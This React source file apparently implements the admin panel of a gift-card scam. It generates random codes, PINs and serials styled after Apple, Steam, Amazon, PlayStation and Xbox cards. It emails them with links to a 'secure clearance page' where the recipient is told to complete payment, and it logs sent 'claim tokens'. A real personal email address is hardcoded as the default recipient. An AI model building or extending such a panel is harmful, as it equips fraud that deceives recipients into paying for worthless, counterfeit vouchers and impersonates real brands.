import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { sendGiftCardEmail } from '../emailService';

const BRANDS = [
    { id: 'apple', name: 'Apple', icon: '' },
    { id: 'steam', name: 'Steam Store', icon: '🎮' },
    { id: 'amazon', name: 'Amazon', icon: '📦' },
    { id: 'playstation', name: 'PlayStation Network', icon: 'Ⓟ' },
    { id: 'xbox', name: 'Xbox Live', icon: 'Ⓧ' }
];

const AMOUNTS = [10, 25, 50, 100];

const Admin = () => {
    const navigate = useNavigate();
    
    // Form fields
    const [toEmail, setToEmail] = useState('nkwam44@gmail.com');
    const [purchaserName, setPurchaserName] = useState('');
    const [selectedBrand, setSelectedBrand] = useState(BRANDS[0]);
    const [selectedAmount, setSelectedAmount] = useState(AMOUNTS[1]);
    const [cardCode, setCardCode] = useState('');
    const [cardPin, setCardPin] = useState('');
    const [cardSerial, setCardSerial] = useState('');
    
    // Status states
    const [sending, setSending] = useState(false);
    const [logs, setLogs] = useState([
        { text: 'SYSTEM: Console initialized. Ready for digital asset dispatch.', type: 'info' }
    ]);
    const [sendHistory, setSendHistory] = useState([]);
    const [toastMessage, setToastMessage] = useState('');

    // Load history from localStorage on mount
    useEffect(() => {
        const stored = localStorage.getItem('money_form_send_history');
        if (stored) {
            try {
                setSendHistory(JSON.parse(stored));
            } catch (e) {
                console.error('Failed to parse history:', e);
            }
        }
    }, []);

    // Save history helper
    const saveHistory = (newHistory) => {
        setSendHistory(newHistory);
        localStorage.setItem('money_form_send_history', JSON.stringify(newHistory));
    };

    const addLog = (text, type = 'info') => {
        setLogs(prev => [...prev, { text: `[${new Date().toLocaleTimeString()}] ${text}`, type }]);
    };

    // Helper to generate realistic codes based on brand
    const handleGenerateDetails = () => {
        const randHex = (len) => {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            let res = '';
            for (let i = 0; i < len; i++) {
                res += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return res;
        };

        let code = '';
        const brandId = selectedBrand.id;
        if (brandId === 'apple') {
            code = `A${randHex(3)}-${randHex(4)}-${randHex(4)}-${randHex(4)}`;
        } else if (brandId === 'steam') {
            code = `${randHex(5)}-${randHex(5)}-${randHex(5)}`;
        } else if (brandId === 'amazon') {
            code = `AQ${randHex(2)}-${randHex(6)}-${randHex(4)}`;
        } else if (brandId === 'playstation') {
            code = `${randHex(4)}-${randHex(4)}-${randHex(4)}`;
        } else if (brandId === 'xbox') {
            code = `${randHex(5)}-${randHex(5)}-${randHex(5)}-${randHex(5)}-${randHex(5)}`;
        }

        const pin = Math.floor(1000 + Math.random() * 9000).toString();
        const serial = `SN-${Math.floor(100000000 + Math.random() * 900000000)}`;

        return { code, pin, serial };
    };

    const handleSendEmail = async (e) => {
        e.preventDefault();

        if (!toEmail || !purchaserName) {
            addLog('ERROR: Recipient email and purchaser name are required!', 'error');
            alert('Please fill out all fields first!');
            return;
        }

        // Auto-generate details securely
        const details = handleGenerateDetails();
        setCardCode(details.code);
        setCardPin(details.pin);
        setCardSerial(details.serial);

        setSending(true);
        addLog(`Initiating secure dispatch for $${selectedAmount} ${selectedBrand.name} Gift Card...`, 'info');
        addLog(`Auto-generated secure details for ${selectedBrand.name}: Code=${details.code}, PIN=${details.pin}, Serial=${details.serial}`, 'success');
        addLog('Tokenizing card details payload into base64 url-safe hash with security clearance verification...', 'info');

        const cardDetails = {
            code: details.code,
            pin: details.pin,
            serial: details.serial
        };

        const result = await sendGiftCardEmail({
            to: toEmail,
            purchaserName,
            brandName: selectedBrand.name,
            amount: selectedAmount,
            cardDetails
        });

        const newHistoryItem = {
            id: Date.now().toString(),
            to: toEmail,
            purchaser: purchaserName,
            brand: selectedBrand.name,
            brandIcon: selectedBrand.icon,
            amount: selectedAmount,
            code: cardCode,
            pin: cardPin,
            serial: cardSerial,
            redeemUrl: result.redeemUrl,
            timestamp: new Date().toLocaleString(),
            status: result.success ? 'Delivered' : (result.isLocalFallback ? 'Local Fallback' : 'Resend Failed')
        };

        const updatedHistory = [newHistoryItem, ...sendHistory];
        saveHistory(updatedHistory);

        if (result.success) {
            addLog(`✅ SUCCESS: Gift card email sent to ${toEmail} successfully.`, 'success');
            addLog(`Voucher Token: ${result.redeemUrl.substring(0, 45)}...`, 'info');
        } else if (result.isLocalFallback) {
            addLog(`⚠️ LOCAL FALLBACK: Email client service simulated locally. Link generated successfully!`, 'info');
            addLog(`Verification Link: ${result.redeemUrl}`, 'success');
        } else {
            addLog(`❌ SEND ERROR: ${result.error || 'Unknown dispatch error'}`, 'error');
            if (result.warning) {
                addLog(`Note: ${result.warning}`, 'info');
            }
            addLog(`Verification Link (still valid to redeem!): ${result.redeemUrl}`, 'success');
        }

        setSending(false);
    };

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        setToastMessage('Redemption URL copied successfully!');
        setTimeout(() => setToastMessage(''), 2000);
    };

    const clearHistory = () => {
        if (confirm('Are you sure you want to clear the dispatch history logs?')) {
            saveHistory([]);
            addLog('System history logs cleared successfully.', 'info');
        }
    };

    return (
        <div className="container" style={{ maxWidth: '1080px', width: '100%' }}>
            <div className="content" style={{ padding: '36px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '24px', flexWrap: 'wrap', gap: '12px' }}>
                    <div>
                        <h1 style={{ marginBottom: '4px' }}>Gift Card Admin Dashboard</h1>
                        <p style={{ margin: 0, fontSize: '13px' }}>Configure gift card assets, tokenize secure details, and dispatch verification redemption flows.</p>
                    </div>
                    <div style={{ display: 'flex', gap: '10px' }}>
                        <button onClick={() => navigate('/')} className="btn btn-secondary" style={{ padding: '8px 16px', width: 'auto', fontSize: '13px' }}>
                            Voucher Hub
                        </button>
                        <button onClick={() => navigate('/users/admin')} className="btn btn-secondary" style={{ padding: '8px 16px', width: 'auto', fontSize: '13px' }}>
                            User Claims
                        </button>
                        <button onClick={() => navigate('/ll/lt/yk/logs')} className="btn btn-secondary" style={{ padding: '8px 16px', width: 'auto', fontSize: '13px' }}>
                            Verification Logs
                        </button>
                    </div>
                </div>

                <div className="admin-grid">
                    {/* Left Column: Configuration Form */}
                    <form onSubmit={handleSendEmail} style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                        
                        {/* 1. Brand Selection */}
                        <div className="form-group">
                            <label className="form-label">1. Select Gift Card Brand</label>
                            <div className="card-grid" style={{ gridTemplateColumns: 'repeat(5, 1fr)', gap: '8px' }}>
                                {BRANDS.map((brand) => (
                                    <div 
                                        key={brand.id}
                                        className={`brand-card ${selectedBrand.id === brand.id ? 'active' : ''}`}
                                        onClick={() => setSelectedBrand(brand)}
                                        style={{ padding: '12px 6px', borderRadius: '12px', gap: '4px' }}
                                    >
                                        <span style={{ fontSize: '18px' }}>{brand.icon}</span>
                                        <span style={{ fontSize: '10px', fontWeight: 'bold' }}>{brand.name.split(' ')[0]}</span>
                                    </div>
                                ))}
                            </div>
                        </div>

                        {/* 2. Amount Selection */}
                        <div className="form-group">
                            <label className="form-label">2. Select Card Denomination (USD)</label>
                            <div className="denomination-list" style={{ gap: '8px' }}>
                                {AMOUNTS.map((amount) => (
                                    <div
                                        key={amount}
                                        className={`denomination-item ${selectedAmount === amount ? 'active' : ''}`}
                                        onClick={() => setSelectedAmount(amount)}
                                        style={{ padding: '10px' }}
                                    >
                                        ${amount}
                                    </div>
                                ))}
                            </div>
                        </div>

                        {/* 3. Recipient Info */}
                        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
                            <div className="form-group">
                                <label className="form-label" htmlFor="recipient-email">3. Recipient Email</label>
                                <input
                                    id="recipient-email"
                                    type="email"
                                    className="form-input"
                                    placeholder="beneficiary@example.com"
                                    value={toEmail}
                                    onChange={(e) => setToEmail(e.target.value)}
                                    required
                                />
                            </div>
                            <div className="form-group">
                                <label className="form-label" htmlFor="purchaser-name">4. Purchaser Name</label>
                                <input
                                    id="purchaser-name"
                                    type="text"
                                    className="form-input"
                                    placeholder="Michael Appiah"
                                    value={purchaserName}
                                    onChange={(e) => setPurchaserName(e.target.value)}
                                    required
                                />
                            </div>
                        </div>

                        {/* 4. Voucher Cryptographics - Automatic Generation */}
                        <div style={{ background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '16px', border: '1px solid rgba(255,255,255,0.04)', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                                <span style={{ color: '#10b981', fontSize: '16px' }}>✓</span>
                                <span style={{ fontSize: '13px', fontWeight: 'bold', color: '#cbd5e1' }}>Automated Cryptographic Generation</span>
                            </div>
                            <p style={{ margin: 0, fontSize: '12px', color: 'var(--text-secondary)', lineHeight: '1.5' }}>
                                Voucher Code, PIN, and Serial Number will be generated securely under the hood using matching official brand structures. The recipient will be taken to the secure clearance page to complete payment and verification.
                            </p>
                        </div>

                        {/* Submit Action */}
                        <button 
                            type="submit" 
                            className="btn" 
                            disabled={sending}
                            style={{ opacity: sending ? 0.7 : 1 }}
                        >
                            <span>{sending ? 'Disseminating Digital Assets...' : '📨 Disseminate & Send Verification Email'}</span>
                        </button>
                    </form>

                    {/* Right Column: Console Log & Live Link Panel */}
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
                        <div>
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                                <label className="form-label" style={{ margin: 0 }}>System Activity Console</label>
                                <span style={{ fontSize: '11px', color: '#6b7280', fontFamily: 'var(--font-mono)' }}>RESEND SERVICE PRO</span>
                            </div>
                            <div className="console-box">
                                {logs.map((log, idx) => (
                                    <div key={idx} className={`console-line ${log.type}`}>
                                        {log.text}
                                    </div>
                                ))}
                            </div>
                        </div>

                        {/* Live Claims links container */}
                        <div>
                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '8px' }}>
                                <label className="form-label" style={{ margin: 0 }}>Active Claim Tokens ({sendHistory.length})</label>
                                {sendHistory.length > 0 && (
                                    <span 
                                        onClick={clearHistory} 
                                        style={{ fontSize: '11px', color: '#ef4444', cursor: 'pointer', textDecoration: 'underline' }}
                                    >
                                        Clear History
                                    </span>
                                )}
                            </div>

                            <div style={{ 
                                background: 'rgba(255,255,255,0.01)', 
                                border: '1px solid rgba(255,255,255,0.04)', 
                                borderRadius: '16px', 
                                padding: '16px',
                                minHeight: '150px',
                                maxHeight: '200px',
                                overflowY: 'auto',
                                display: 'flex',
                                flexDirection: 'column',
                                gap: '10px'
                            }}>
                                {sendHistory.length === 0 ? (
                                    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', height: '120px', color: 'var(--text-secondary)', fontSize: '13px', fontStyle: 'italic' }}>
                                        No active claim tokens generated.
                                    </div>
                                ) : (
                                    sendHistory.map(item => (
                                        <div key={item.id} style={{ 
                                            background: 'rgba(255,255,255,0.02)', 
                                            border: '1px solid rgba(255,255,255,0.05)', 
                                            borderRadius: '10px', 
                                            padding: '10px',
                                            fontSize: '12px'
                                        }}>
                                            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '6px', fontWeight: 'bold' }}>
                                                <span style={{ color: '#cbd5e1' }}>{item.brandIcon} ${item.amount} to {item.to}</span>
                                                <span style={{ 
                                                    color: item.status === 'Delivered' ? '#10b981' : '#f59e0b',
                                                    fontSize: '10px',
                                                    background: item.status === 'Delivered' ? 'rgba(16,185,129,0.1)' : 'rgba(245,158,11,0.1)',
                                                    padding: '2px 6px',
                                                    borderRadius: '6px'
                                                }}>
                                                    {item.status}
                                                </span>
                                            </div>
                                            <div style={{ color: 'var(--text-secondary)', fontSize: '11px', marginBottom: '6px' }}>
                                                Purchased by: {item.purchaser} | Code: {item.code}
                                            </div>
                                            <div style={{ display: 'flex', gap: '8px' }}>
                                                <a 
                                                    href={item.redeemUrl} 
                                                    target="_blank" 
                                                    rel="noopener noreferrer"
                                                    style={{ 
                                                        color: '#6366f1', 
                                                        textDecoration: 'none', 
                                                        fontWeight: 'bold',
                                                        display: 'inline-flex',
                                                        alignItems: 'center',
                                                        gap: '3px'
                                                    }}
                                                >
                                                    🚀 Launch Redeem Page
                                                </a>
                                                <span style={{ color: 'rgba(255,255,255,0.1)' }}>|</span>
                                                <span 
                                                    onClick={() => copyToClipboard(item.redeemUrl)}
                                                    style={{ color: 'var(--text-secondary)', cursor: 'pointer', textDecoration: 'underline' }}
                                                >
                                                    Copy Link
                                                </span>
                                            </div>
                                        </div>
                                    ))
                                )}
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            {toastMessage && <div className="toast-msg">{toastMessage}</div>}
        </div>
    );
};

export default Admin;
